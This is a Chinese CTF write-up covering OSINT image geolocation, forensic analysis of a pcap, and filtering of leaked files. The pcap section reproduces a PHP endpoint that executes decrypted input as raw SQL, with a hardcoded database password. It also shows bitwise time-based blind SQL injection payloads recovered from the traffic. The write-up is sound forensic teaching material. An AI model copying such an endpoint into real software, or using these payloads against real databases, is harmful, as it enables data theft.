---
title: '2025 某内部赛 湖北移动 Writeup'
description: '百度识图找到一篇文章'
pubDate: 2025-03-20
author: 'IHK-1'
tags: ['CTF', '湖北移动', '内部赛', '2025']
---

# 马路
<!-- 这是一张图片，ocr 内容为：相关商品 实时流媒体画面传输 颐达骐达机子 2K超清 轻松应对各种复杂情况 手机APP互联 播环录制  车辅劲  的后双揭 采用资源体传输技术,实时显示行车尚商,解决传统 后祝快发天气部劳导效看不清的问题 现货 车载MP5音乐播放倒车影像 闪发 下单就赠39元进口香蕉! ￥1600.00 ￥113.00 08夫 ￥1500.00 7寸日产经典轩逸老轩逸老骐达颐达安卓蓝牙版 360360流媒体后视镜行车记录仪M3202K流媒 360360行车记录仪全触大屏流媒体2K超清前后 3603 中控改装一体机导航 倒车 体全景双摄高清倒车影像(2K)M320升级... 双录停车监控新款[店内臻品]重力感应碰... 京东 拼多多 京东 京东 图片来源 你在傍晚的公园见过马群啃绿化带吗/牧区唐卡|耗牛_网易订阅 网易号 -->


百度识图找到一篇文章

<!-- 这是一张图片，ocr 内容为：在电影(脐带)中,乔思雪将许多童年时期就刻在记忆里的人物与景象放了进来.比 如坐在路边穿着蒙古袍卖牛奶的妇人,楼道里,街边躺着睡觉的酒鬼,以及在马路的 车流中突然出现骑马的牧民. 我将我的声音 I SEND MY VOICE 大街上骑马飞奔的人|来自影片脐带 在这个全内蒙最 在电影院里看到这一幕时,我仿佛也回到 了鄂温克旗巴彦托海镇. 生猛的地方,你能在零下四十多度的冬天里看见街边冻死的醉鬼安详地抱着酒瓶躺在 雪地里;在空气中满是蒿草气味的夏天里,被姥姥牵着去胡同口买牛奶,她会和那 -->


这里有关键信息，对鄂温克旗子的大桥多次排查

<!-- 这是一张图片，ocr 内容为：海拉尔一职 六馆一湖旅游区 海拉尔区 学府路中学 文 南开路中学 海拉尔第二中学 呼伦贝尔职业 技术学院 天骄小学 呼伦贝尔市政府 呼伦贝尔路 伊敬河 友联村 S202 海拉尔农业 巴彦托海汽车站 发展园区 中信大厦 华和农牧业 伊敏河 有限公司 天伦大街 巴彦托海镇 S201 内蒙古民族 体育中心 龙达畜牧 -->


最终确定为安达大桥

<!-- 这是一张图片，ocr 内容为：无回 挖泰周边 上传全景图 时光机 返回地图 未知道路                                                                                                  -->


# 哪吒
<!-- 这是一张图片，ocr 内容为：40 取消 BACKWARDS OPLIONG 宽军 192.168.118.2 139.148.187.50 1472 PUT /VAR/WOW/HTNL/SQL.PHP HTTP/1.1 139.148.187.50 192.168.118.2 139.148,187,50 TCP 192.168.118.2 8509 11.439697 139,148.187,50 192.168.118.2 TCP 139.148.187.50 8517 11.443160 192.168.118.2 192.168.118.2 192.168.118.2 139.148.187.50 8515 11.442496 66 42888 + 51 [ACK] SEQ-1407 ACKUS1 WEN-69256 LEA-9 TSVAL-LJ59934285 7582-1778280861 139.148.187.50 192.168.118.2 139.148.187.50 192.168.118.2 分组:17840-DISPLAYED:10(0.1%) -->


对 length 大小进行倒序有个 SQL.php 的 PUT 上传最大

<!-- 这是一张图片，ocr 内容为：HTTP PROTOCOL LEN! INFO DESTINATION TIME NO. SOURCE 139.148.187.50 8512 11.440430 192.168.118.2 1472 PUT /VAR/WWW/HTML/SOL.PHP HTTP/1.1 HTTP (TEXT/PLAIN) 192.168.118.2 17275803.498941 61.136.84.60 HTTP 346 HTTP/1.1 200 OK (TEYT/NLAIN) 192 168 118 2 123 110 19 241 346 H 17245 801 499476 204   0K -->


<!-- 这是一张图片，ocr 内容为：WIRESHARK  追踪 HTTP 流(TCP.STREAM EQ 844).!NETA.PCAP PUT /VAR/WWW/HTML/SQL.PHP HTTP/1.1 HOST:139.148.187.50:81 :CUR1/8.12.1 USER-AGENT: ACCEPT: */* CONTENT-LENGTH:1283 <?PHP HEADER('CONTENT-TYPE: TEXT/PLAIN; CHARSET-UTF-8'); DEFINE('AES KEY', 'YOUR_32 BYTE_AES KEY HERE 1234567890!'); $IV - ISSET($ GET['IV']) ? URLDECODE($ GET['IV']) : $CIPHERTEXT FILE_GET_CONTENTS("PHP://INPUT"); (EMPTY($IV) LL EMPTY($CIPHERTEXT)) DIE("ERROR") FUNCTION GENERATEFLAGWITHMD5() $RANDOMSTRING - BIN2HEX(RANDOM_BYTES(16)); $MD5VALUE MDS($RANDOMSTRING); RETURN "FLAG{" $MDSVALUE TRY $IV BASE64 DECODE($IV); $CIPHERTEXT- BASE64 DECODE($CIPHERTEXT); $PLAINTEXT -OPENSSL DECRYPT( $CIPHERTEXT, AES-256-CBC' AES KEY, OPENSSL RAW DATA, ($PLAINTEXT MM  FALSE) THROW NEW EXCEPTION( ERROR" $HOST LOCALHOST'; $USERNAME SGL AAA TEST COM'; 48E35F6C829788'; $PASSWORD $DBNAME SQL AAA TEST T COM $CONN - NEW MYSQLI($HOST, $USERNAME, $PASSWORD, $DBNAME); IF ($CONN->CONNECT_ERROR) DIE('ERROR  ); $SQL  $PLAINTEXT; $RESULT $CONN->QUERY($SQL); IF($RESULT->NUM_ROWS >0) WHILE($ROW $RESULT->FETCH A _ASSOC() 1%务最分组, 分组8512,1客户端分组,1服 TURN(S)点击选择 显示为 整个对话(1486 BYTES) NO DELTA TIMES ASCIL 844 搜索 -->


```plain
<?php
header('Content-Type: text/plain; charset=utf-8');
define('AES_KEY', 'your_32_byte_aes_key_here_1234567890!');
$iv = isset($_GET['iv']) ? urldecode($_GET['iv']) : '';
$ciphertext=file_get_contents("php://input");

if (empty($iv) || empty($ciphertext)) {
    die("error");
}

function generateFlagWithMD5() {
    $randomString = bin2hex(random_bytes(16));
    $md5Value = md5($randomString);
    return "flag{" . $md5Value . "}";
}



try {

    $iv = base64_decode($iv);
    $ciphertext = base64_decode($ciphertext);
    $plaintext = openssl_decrypt(
        $ciphertext,
        'aes-256-cbc',
        AES_KEY,
        OPENSSL_RAW_DATA,
        $iv
    );
    
    if ($plaintext === false) {
        throw new Exception('error');
    }

    
    $host = 'localhost';
    $username = 'sql_aaa_test_com';
    $password = '48e35f6c829788';
    $dbname = 'sql_aaa_test_com';
    
    $conn = new mysqli($host, $username, $password, $dbname);
    

    if ($conn->connect_error) {
        die("error ");
    }

    $sql = $plaintext;
    $result = $conn->query($sql);
    
    if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            echo generateFlagWithMD5();
        }
    }
    $conn->close();

} catch (Exception $e) {
    die("error");
}


?>
```

分析代码其输入 iv 以及 cipherdata ，如果执行成功则输出 md5 ，进行 tshark 过滤，提取 http 请求以及 post data 数据

```plain
tshark -r "!NETA.pcap" -T fields -Y 'http.request.method == "POST" && http.file_data' -e 'http.request.uri' -e 'http.file_data' > out.txt
```

写出对应的解密

```plain
import binascii
import base64
from urllib.parse import unquote
from Crypto.Cipher import AES

out_list = []
for line in open(r"out.txt",encoding='utf-8',errors='ignore').readlines():
    iv,cipher = line.strip().split()
    iv = iv.split('/')[-1]
    cipher = binascii.unhexlify(cipher.encode()).decode()
    AES_KEY = b'your_32_byte_aes_key_here_123456'

    iv = base64.b64decode(unquote(iv))
    ciphertext = base64.b64decode(cipher)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    plaintext_padded = cipher.decrypt(ciphertext)

    plaintext = plaintext_padded.rstrip(b'\x00')

    print(plaintext.decode('utf-8').strip())
```

<!-- 这是一张图片，ocr 内容为：APP.PY 项目 TESTPY IMPORT BINASCII 2348 IMPORT BASE64 FROM URLLIB.PARSE IMPORT UNQUOTE FROM CRYPTO.CIPHER IMPORT AES 5 OUT_LIST[] 6 LFOR LINE IN OPEN(R"C:VUSERS HK(DESKTOP)OUT.TXT',ENCODINGE'UTF-8', ERRORSS'IGNORE').REAOLINESO; 7 IV,CIPHER - LINE.STRIPO.SPLITO) 8  IV : IV.SPLIT(')[-1] 9 VOL CIPHER - BINASCII.UNHEXLIFY(CIPHER.ENCODE()).DECODE() AES KEY - B'YOUR_32_BYTE_AES_KEY_HERE_123456' SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),1,1) & 1 - 1 - 1,SLEEP(1),0) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),1,1,1) & 16 - 16,SLEEP(1),0) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),1,1,1) & 2 : 2,SLEEP(1),0) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),1,1,1) & 8 - 8,SLEEP(1),0) L吧归 SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),1,1) & 4 - 4,SLEEP(1),0),0) SELECT IF(ASCII(MID(SELECT FLAQ FRON FLAG),1,1,1) & 32 - 32,SLEEP(1),0) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),1,1,1) & 64 - 64,SLEEP(1),0) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),2,1) & 1 - 1 - 1,SLEEP(1),0) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),2,1) & 2 : 2 : 2,SLEEP(1),0) SELECT IF(ASCII(MID((SELECT FLAG FROM FLAG),2,1) & 64 - 64,SLEEP(1),0) SELECT IF(ASCII(MID((SELECT FLAG FROM FLAG),2,1) & 32 : 32,SLEEP(1),0) SELECT IF(ASCII(MID((SELECT FLAG FROM FLAG),2,1) & 16 - 16,SLEEP(1),0) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),2,1) & 4 - 4 - 4,SLEEP(1),D) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),2,1) & 8 - 8,SLEEP(1),0) SELECT IF(ASCII(MID(SELECT FLAG FROM FLAG),3,1)) & 16 - 16,SLEEP(1),0) -->


发现解密出来的结果如果是正确的则会进行 sleep1，再次对回显进行过滤，将回显时间阈值超过 0.5 的进行过滤

```plain
tshark -r "!NETA.pcap" -T fields -Y 'http.response.code == 200 && http.time >= 0.5' -e 'http.request.uri' > true.txt
```

同时flag的第一个字符和上面的数做“&”操作返回的值是这些数本身，就说明flag第一个字符的二进制形式中对应的bit是1假设flag第一个字符的二进制形式是 m1,m2,m3,m4,m5,m6,m7,m8比如和2做“&”返回的值是2，这就说明 m7的值是1以此类推，m2 = 1,m3 = 1,m6 = 1,m7 = 1，写出过滤以及解密

```plain
import binascii
import base64
from urllib.parse import unquote
from Crypto.Cipher import AES
import re

true_iv = []
for line in open(r"true.txt").readlines():
    true_iv.append(line.strip().split('/')[-1])

out_list = {}
for line in open(r"out.txt", encoding='utf-8', errors='ignore').readlines():
    iv, cipher = line.strip().split()
    iv = iv.split('/')[-1]
    if iv in true_iv:
        cipher = binascii.unhexlify(cipher.encode()).decode()
        AES_KEY = b'your_32_byte_aes_key_here_123456'

        iv = base64.b64decode(unquote(iv))
        ciphertext = base64.b64decode(cipher)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        plaintext_padded = cipher.decrypt(ciphertext)
        plaintext = plaintext_padded.rstrip(b'\x00').strip().decode()

        data = re.search(r'select if\(ascii\(mid\(\(select flag from flag\),(\d+),1\)\) & (\d+) = (\d+),',plaintext).groups()
        if data[0] not in out_list:
            out_list[data[0]] = str(data[1])
        else:
            out_list[data[0]] = out_list[data[0]] + ',' + str(data[1])

flag = ""
for i in out_list:
    tmp = out_list[i]
    m = sum(map(int, tmp.split(',')))
    flag += chr(m)
print(flag)
```

# 信息泄露
JPG 部分: 

```plain
from pyzbar import pyzbar
from PIL import Image
import os
import re

# JPG
for filename in os.listdir(r"C:\Users\HK\Desktop\信息泄露\JPG"):
    try:
        image = Image.open(rf"C:\Users\HK\Desktop\信息泄露\JPG\{filename}")
        decoded = pyzbar.decode(image)
        data = decoded[0].data.decode('utf-8')
        if len(re.findall(r'[a-zA-Z0-9]|码|址',data)):
            print(f"{filename}")
        image.close()
    except:
        pass

135.jpg
154.jpg
168.jpg
379.jpg
46.jpg
7.jpg
```

TXT 部分: 

```plain
import os
import re

folder = r"C:\Users\HK\Desktop\信息泄露\TXT"
for filename in os.listdir(folder):
    filepath = os.path.join(folder, filename)
    with open(filepath, encoding='utf-8') as f:
        data = f.read()

    if re.search(r'[a-zA-Z0-9]|址|码', data):
        print(filename)

7.txt
```

MP3 部分手动过滤

项目：[https://github.com/jianchang512/stt](https://github.com/jianchang512/stt)

<!-- 这是一张图片，ocr 内容为：语音识别V0.0.94 下载模型 遇到问题? DISCORD GITHUB 上传成功199.WAV 0:00/0:28 100% D: 上传成功190.WAV 0:00/0:22 100% 18.31 SEC 0:00/0:33 上传成功197WAV 100%  25.78 SEC 上传成功198.WAV 0:00/0:26 100% 25.56 SEC 0 : 0:00/0:24 100% 19.53 SEC 上传成功200.WAV ; 上传成功193.WAY 0:00/0:38 100%  24.38 SEC 返回格式 网络代理地址 纯文字 独立导出 代理 自动导出 是 中文 发音语言 选择模型 关闭 TINY TINY到ARG8-13换型识别起来越精确,但也更清托资源,如果不具管CUDA加速环境,请勿选用BARGE系校型 导出文本 立即识别(CPU) 190.WAY 作者,帝白,朝台,堂,忽建恒施出义,消春字罪无迷,白陆登记轻山,罪白云和方数. 不清理间,远处的山软默默的陪伴信性的夜晚. 不清理间,远处的山软默默的陪伴信性的夜晚. -->


根据文档调整模型，批量识别后手动搜索 地址 号码 的字符串

